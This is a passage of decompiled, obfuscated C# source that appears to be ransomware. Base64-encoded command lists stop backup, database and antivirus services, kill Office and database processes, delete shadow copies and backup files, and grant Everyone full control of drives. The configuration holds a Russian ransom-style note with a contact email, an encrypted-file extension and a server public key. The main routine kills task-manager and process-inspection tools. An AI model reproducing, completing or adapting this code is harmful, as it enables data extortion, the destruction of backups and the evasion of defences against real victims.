		joRKfFeYni("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
		joRKfFeYni("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
		joRKfFeYni("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		joRKfFeYni("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
		joRKfFeYni("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
		joRKfFeYni("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
		joRKfFeYni("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		joRKfFeYni("c3RvcCBNU1NRTCRQUk9EIC95"),
		joRKfFeYni("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		joRKfFeYni("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		joRKfFeYni("c3RvcCBBbnRpdmlydXMgL3k="),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		joRKfFeYni("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
		joRKfFeYni("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
		joRKfFeYni("c3RvcCBBVlAgL3k="),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		joRKfFeYni("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
		joRKfFeYni("c3RvcCBEQ0FnZW50IC95"),
		joRKfFeYni("c3RvcCBiZWRiZyAveQ=="),
		joRKfFeYni("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
		joRKfFeYni("c3RvcCBFaHR0cFNydiAveQ=="),
		joRKfFeYni("c3RvcCBNTVMgL3k="),
		joRKfFeYni("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
		joRKfFeYni("c3RvcCBla3JuIC95"),
		joRKfFeYni("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
		joRKfFeYni("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
		joRKfFeYni("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
		joRKfFeYni("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		joRKfFeYni("c3RvcCBNU1NRTCRUUFMgL3k="),
		joRKfFeYni("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
		joRKfFeYni("c3RvcCBudHJ0c2NhbiAveQ=="),
		joRKfFeYni("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
		joRKfFeYni("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
		joRKfFeYni("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		joRKfFeYni("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		joRKfFeYni("c3RvcCBFU0hBU1JWIC95"),
		joRKfFeYni("c3RvcCBTRFJTVkMgL3k="),
		joRKfFeYni("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
		joRKfFeYni("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		joRKfFeYni("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
		joRKfFeYni("c3RvcCBLQVZGUyAveQ=="),
		joRKfFeYni("c3RvcCBTUUxXcml0ZXIgL3k="),
		joRKfFeYni("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
		joRKfFeYni("c3RvcCBLQVZGU0dUIC95"),
		joRKfFeYni("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
		joRKfFeYni("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
		joRKfFeYni("c3RvcCBrYXZmc3NscCAveQ=="),
		joRKfFeYni("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
		joRKfFeYni("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
		joRKfFeYni("c3RvcCBrbG5hZ2VudCAveQ=="),
		joRKfFeYni("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
		joRKfFeYni("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
		joRKfFeYni("c3RvcCBtYWNtbnN2YyAveQ=="),
		joRKfFeYni("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
		joRKfFeYni("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
		joRKfFeYni("c3RvcCBtYXN2YyAveQ=="),
		joRKfFeYni("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		joRKfFeYni("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
		joRKfFeYni("c3RvcCBNQkFNU2VydmljZSAveQ=="),
		joRKfFeYni("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
		joRKfFeYni("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
		joRKfFeYni("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
		joRKfFeYni("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
		joRKfFeYni("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
		joRKfFeYni("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
		joRKfFeYni("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
		joRKfFeYni("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
		joRKfFeYni("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
		joRKfFeYni("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
		joRKfFeYni("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
		joRKfFeYni("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
		joRKfFeYni("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		joRKfFeYni("c3RvcCBNeVNRTDU3IC95"),
		joRKfFeYni("c3RvcCBNY1NoaWVsZCAveQ=="),
		joRKfFeYni("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
		joRKfFeYni("c3RvcCBNeVNRTDgwIC95"),
		joRKfFeYni("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
		joRKfFeYni("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		joRKfFeYni("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
		joRKfFeYni("c3RvcCBtZmVmaXJlIC95"),
		joRKfFeYni("c3RvcCB3YmVuZ2luZSAveQ=="),
		joRKfFeYni("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		joRKfFeYni("c3RvcCBtZmVtbXMgL3k="),
		joRKfFeYni("c3RvcCB3YmVuZ2luZSAveQ=="),
		joRKfFeYni("c3RvcCBSRVN2YyAveQ=="),
		joRKfFeYni("c3RvcCBtZmV2dHAgL3k="),
		joRKfFeYni("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
		joRKfFeYni("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
		joRKfFeYni("c3RvcCBzYWNzdnIgL3k="),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
		joRKfFeYni("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
		joRKfFeYni("c3RvcCBTQVZTZXJ2aWNlIC95"),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
		joRKfFeYni("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
		joRKfFeYni("c3RvcCBTaE1vbml0b3IgL3k="),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
		joRKfFeYni("c3RvcCBTbWNpbnN0IC95"),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		joRKfFeYni("c3RvcCBTbWNTZXJ2aWNlIC95"),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
		joRKfFeYni("c3RvcCBTbnRwU2VydmljZSAveQ=="),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
		joRKfFeYni("c3RvcCBzb3Bob3NzcHMgL3k="),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
		joRKfFeYni("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
		joRKfFeYni("c3RvcCBzd2lfZmlsdGVyIC95"),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
		joRKfFeYni("c3RvcCBzd2lfc2VydmljZSAveQ=="),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
		joRKfFeYni("c3RvcCBzd2lfdXBkYXRlIC95"),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		joRKfFeYni("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
		joRKfFeYni("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
		joRKfFeYni("c3RvcCBUbUNDU0YgL3k="),
		joRKfFeYni("c3RvcCBTUUxCcm93c2VyIC95"),
		joRKfFeYni("c3RvcCB0bWxpc3RlbiAveQ=="),
		joRKfFeYni("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		joRKfFeYni("c3RvcCBUcnVlS2V5IC95"),
		joRKfFeYni("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		joRKfFeYni("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		joRKfFeYni("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		joRKfFeYni("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		joRKfFeYni("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		joRKfFeYni("c3RvcCBXUlNWQyAveQ=="),
		joRKfFeYni("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		joRKfFeYni("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> AXHIhGyjeeBMt = new List<string>
	{
		joRKfFeYni("Y29uZmlnIERuc2NhY2hlIHN0YXJ0PSBhdXRv"),
		joRKfFeYni("Y29uZmlnIEZEUmVzUHViIHN0YXJ0PSBhdXRv"),
		joRKfFeYni("Y29uZmlnIFNTRFBTUlYgc3RhcnQ9IGF1dG8="),
		joRKfFeYni("Y29uZmlnIHVwbnBob3N0IHN0YXJ0PSBhdXRv"),
		joRKfFeYni("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		joRKfFeYni("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		joRKfFeYni("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		joRKfFeYni("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> szeHmEmHOlMXs = new List<string>
	{
		joRKfFeYni("L0lNIG1zcHViLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		joRKfFeYni("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		joRKfFeYni("L0lNIG15c3FsZC5leGUgL0Y="),
		joRKfFeYni("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		joRKfFeYni("L0lNIGFnbnRzdmMuZXhlIC9G"),
		joRKfFeYni("L0lNIHRoZWJhdC5leGUgL0Y="),
		joRKfFeYni("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIGVuY3N2Yy5leGUgL0Y="),
		joRKfFeYni("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIENOVEFvU01nci5leGUgL0Y="),
		joRKfFeYni("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		joRKfFeYni("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIGRiZW5nNTAuZXhlIC9G"),
		joRKfFeYni("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		joRKfFeYni("L0lNIG9jb21tLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		joRKfFeYni("L0lNIHpvb2x6LmV4ZSAvRg=="),
		joRKfFeYni("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		joRKfFeYni("L0lNIGRic25tcC5leGUgL0Y="),
		joRKfFeYni("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		joRKfFeYni("L0lNIG1zcHViLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIG9uZW5vdGUuZXhlIC9G"),
		joRKfFeYni("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIG91dGxvb2suZXhlIC9G"),
		joRKfFeYni("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		joRKfFeYni("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		joRKfFeYni("L0lNIHZpc2lvLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		joRKfFeYni("L0lNIHdpbndvcmQuZXhlIC9G"),
		joRKfFeYni("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		joRKfFeYni("L0lNIHdvcmRwYWQuZXhlIC9G"),
		joRKfFeYni("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		joRKfFeYni("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		joRKfFeYni("L0lNIG9jc3NkLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIG9yYWNsZS5leGUgL0Y="),
		joRKfFeYni("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		joRKfFeYni("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		joRKfFeYni("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		joRKfFeYni("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> vcERAqomxNm = new List<string>
	{
		joRKfFeYni(tvWunvyFIKOf("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR")),
		joRKfFeYni(tvWunvyFIKOf("=IUTxADN9UmepNHeh12LgozY942bvAiOj1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		joRKfFeYni(tvWunvyFIKOf("kVGZuV3bi5Wd9UmepNHeh12LgozY942bvAiOj1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		joRKfFeYni(tvWunvyFIKOf("=IUTxADN9UmepNHeh12LgoDZ942bvAiOk1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		joRKfFeYni(tvWunvyFIKOf("kVGZuV3bi5Wd9UmepNHeh12LgoDZ942bvAiOk1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		joRKfFeYni(tvWunvyFIKOf("=IUTxADN9UmepNHeh12LgoTZ942bvAiOl1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		joRKfFeYni(tvWunvyFIKOf("kVGZuV3bi5Wd9UmepNHeh12LgoTZ942bvAiOl1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		joRKfFeYni("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		joRKfFeYni(tvWunvyFIKOf("kVGZuV3bi5Wd9UmepNHeh12LgojZ942bvAiOm1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmc")),
		joRKfFeYni("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		joRKfFeYni("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		joRKfFeYni("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		joRKfFeYni("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		joRKfFeYni(tvWunvyFIKOf("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR"))
	};

	public static string jDEqIhTjGP = joRKfFeYni("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkX0RlbGV0ZSgpOyB9");

	public static List<string> OpmmfikZaXsJBD = new List<string>
	{
		joRKfFeYni("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		joRKfFeYni("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		joRKfFeYni("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		joRKfFeYni("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		joRKfFeYni("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		joRKfFeYni("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static List<string> aHSLAPEjrMaCz = new List<string>
	{
		joRKfFeYni("IkM6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		joRKfFeYni("IkQ6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		joRKfFeYni("Ilo6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=")
	};

	public static string zPyIMavdBaBAPU = "NO";

	public static string APlsmtlJYveR = "NO";

	internal static DateTime zUXHvjwEmI = new DateTime(2000, 1, 1);

	internal static DateTime TXrpRvpTasTwlmB = new DateTime(2100, 1, 1);

	public static string VPAHoMRqycZH = "YES";

	public static string oIPxacaZFPrUD = "10";

	public static string WIhylljKzkeZ = "NO";

	public static string yYFDkDNMlgTM = "NO";

	public static string dcCxpVKKpD = "NO";

	public static string ckPYFTURHZwB = "YES";

	public static string WvcfffSBJcut = "NO";

	public static string zZHWpuVxsPg = "NO";

	public static List<string> CaWnKQHcaGrIr = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string CxqzogRLMjBXRE = "NO";

	public static string ChPvsDcZDKEbb = "1";

	public static string NxFXfQuLVoR = "YES";

	public static string KAWZebQNpMVlGZo = "NO";

	public static string EkfjNvfNBYMxYM = "NO";

	public static string xxemfVpsFwlEjNAk = string.Empty;

	public static string WeAGofyEuKlnKnX = "NO";

	public static string zSvnXhdXFcyye = "YES";

	public static string aSTzHoNGAgWsQX = "YES";

	public static string FTBHcmxKhCRSXf = "0JLQvdC40LzQsNC90LjQtSDQktC90LjQvNCw0L3QuNC1INCS0L3QuNC80LDQvdC40LUh";

	public static string kHqnKxGzzKywC = "0JTQvtCx0YDRi9C5INC00LXQvdGMLiDQoyDQktCw0YEg0LLQvtC30L3QuNC60LvQuCDRgdC70L7QttC90L7RgdGC0Lgg0L3QsCDRgNCw0LHQvtGC0LU/IA0K0J3QtSDRgdGC0L7QuNGCINC/0LXRgNC10LbQuNCy0LDRgtGMLCDQvdCw0YjQuCBJVC3RgdC/0LXRhtC40LDQu9C40YHRgtGLINC/0L7QvNC+0LPRg9GCINCS0LDQvC4NCtCU0LvRjyDRjdGC0L7Qs9C+INC90LDQv9C40YjQuNGC0LUg0L/QvtC20LDQu9GD0LnRgdGC0LAg0L3QsNC8INC90LAg0L/QvtGH0YLRgy4NCg0K0J3QsNGIIGVtYWlsIC0gc2VjdXJlNDM1M0Btc2dzYWZlLmlvDQoNCtCl0L7RgNC+0YjQtdCz0L4g0Lgg0L/RgNC+0LTRg9C60YLQuNCy0L3QvtCz0L4g0LTQvdGPIQ==";

	public static string acqiTPtwbkyNRUi = "NO";

	public static string fODFastDeDbE = "YES";

	public static string LPoVZAteiiRKPJ = "NO";

	public static string livWHzgfjGZbz = "NO";

	public static string rXvqFwcUrTOJU = "NO";

	public static string UswXsnGAnhoBIN = "LOGONISOFF";

	public static string wVJnKmenJwttPl = "NO";

	public static string taMlWXBfKLGNk = "YES";

	public static string vDqPFVseLDSEcY = "reload1.lnk";

	public static string gfQBPZXmtxR = "NO";

	public static string YNeLFQebpndLj = "YES";

	public static string ksPvkjCzIwfV = "NO";

	public static string yRchNUgjMpalF = "NO";

	public static string hOBSsVzXhREJ = "SHVicmlz";

	public static string DcTMAxKEfG = "YES";

	public static string HjepCHoOwiDqIr = "YES";

	public static string gwlmCTkvXmgbyuJT = "NO";

	public static string rBsdayiXZHoe = "YES";

	public static string[] tKgBOoKLAyrw = new string[10] { "ragent.exe", "rmngr.exe", "rphost.exe", "1cv8.exe", "sql.exe", "sqld.exe", "mysql.exe", "mysqld.exe", "oracle.exe", "1c.exe" };

	public static string BHMRzZEpeyy = "YES";

	public static bool BnBkXlAwDSWJ = true;

	public static string VqCooiuVqHTq = "YES";

	public static bool zzEQfIIuvgiBbM = true;

	public static bool TpOjlZaYAqM = true;

	public static bool SOayMzRkvc = true;

	public static bool cBlDNBQZGaRop = true;

	public static string zRTqZqtXid = "Debug_Log.txt";

	public static bool nOaztTOGmlogd = false;

	public static bool OqVLzifHTWM = true;

	public static bool IXJSnBISlmQN = false;

	public static bool lAAXflzcqhB = false;

	public static bool ZpQytShExiATF = true;

	public static string mPCnRrJrfRICdG = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + tbTGHSHczYFiA.eRjoPReHvhw() + ".txt";

	public static bool aLMUqgosPdtj = false;

	public static Stopwatch tFRxjkBWLZhmRnz = new Stopwatch();

	public static int ZmTUAzYynatCYr = 0;

	public static int UrQRBEHxUHKK = 0;

	public static bool FDgJvwVvfGwgSO = false;

	public static string pwDwUXHyIHVn = ".[ID-" + tbTGHSHczYFiA.eRjoPReHvhw() + "]";

	public static string[] iouzOcckPKXC = new string[1] { "\"db\",\"dbf\",\"accdb\",\"dbx\",\"mdb\",\"mdf\",\"epf\",\"ndf\",\"ldf\",\"1cd\",\"sdf\",\"nsf\",\"fp7\",\"cat\",\"log\"" };

	public static List<string> rZJokgIxaykmN = new List<string>();

	public static int UIEwMIIeUW = 0;

	public static bool bAJKJVOJOLbMhb = true;

	public static bool ZvJFLWaufAljve = true;

	public static bool GwONzlFMcsJ = true;

	public static bool DJyFuHzPdduoi = false;

	public static bool wKjZvwDAADJADi = false;

	public static bool CGcSKksPgfyIShZD = false;

	public static List<string> XItXBmyQDtCnl = new List<string>();

	public static string vcDNSNpbTqBA = "SERVERPUBLICECCKEY";

	public static bool IUeXbBJIfNgWuv = false;

	public static List<string> VjAwANiXIxmMk = new List<string>();

	public static List<string> pQITJsOGuSpMy = new List<string>();

	public static List<string> BINzanWsLODuSCE = new List<string>();

	public static byte[] tRfebFlORRrk;

	public static byte[] iZDhoDCXicua;

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint BZRlJNhdqUI, uint qZOWbpDCnNYmk);

	private static void Main(string[] args)
	{
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		try
		{
			string EAxeDjjiNnu = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process p) => p.ProcessName == EAxeDjjiNnu) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			tPlomIYkPtoDS.SWjYDLNpXKPQ(dqWxFluIOh);
		}
		catch (Exception)
		{
		}
		try
		{
			if (DcTMAxKEfG == "YES")
			{
				Thread thread = new Thread(PHdhvmNgHRZcCc.QLqwCeUDgdCg);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (cNBufbZlSmFXnD == "YES")
		{
			Thread.Sleep(int.Parse(wMeaztRpjSaV));
		}
		if (NxFXfQuLVoR == "YES")
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					string[] PFFHDAwoyhOd = new string[4]
					{
						joRKfFeYni("VGFza21ncg=="),
						joRKfFeYni("dGFza21ncg=="),
						joRKfFeYni("UHJvY2Vzc0hhY2tlcg=="),
						joRKfFeYni("cHJvY2V4cA==")
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						RPURcUKzFBlLnC.KIrWzzeZUlrxQ(PFFHDAwoyhOd);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				zzAilQtjoIjW.tUPlXgIfRBFV(joRKfFeYni("dGFza21ncg=="));
			}
			catch
			{
			}
			try
			{
				zzAilQtjoIjW.tUPlXgIfRBFV(joRKfFeYni("cHJvY2V4cA=="));
			}
			catch
			{
			}
			try
			{
				zzAilQtjoIjW.tUPlXgIfRBFV(joRKfFeYni("cHJvY2V4cDY0"));
			}
			catch
			{
			}
			try
			{
				zzAilQtjoIjW.tUPlXgIfRBFV(joRKfFeYni("UHJvY2Vzc0hhY2tlcg=="));
			}
			catch
			{
			}
			Thread thread3 = new Thread(RPURcUKzFBlLnC.etwZpDMlmSUF);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && WvcfffSBJcut == "YES")
		{
			try
			{
				NASiTqcixVzOI(joRKfFeYni(tvWunvyFIKOf("==AZlxmYhNXaEByczV2YjFkclRGbvZEZlxGbvJHdu92QlxmYh5WRtASZj5WZyVmZlJHUw1UL0V2U")));
			}
			catch
			{
			}
		}
		try
		{
			if (POZEZRBeRc == "YES" && vmUKXHgePAyzJ.DICqAxqZDleFwHj())
			{
				new RxFJqSbhHcd().oUyyOuPtzVaXRpIE(ApCvDRSfYgD: false);
				vmUKXHgePAyzJ.rxsHwzARDaccp();
			}
		}
		catch (Exception)
		{
		}
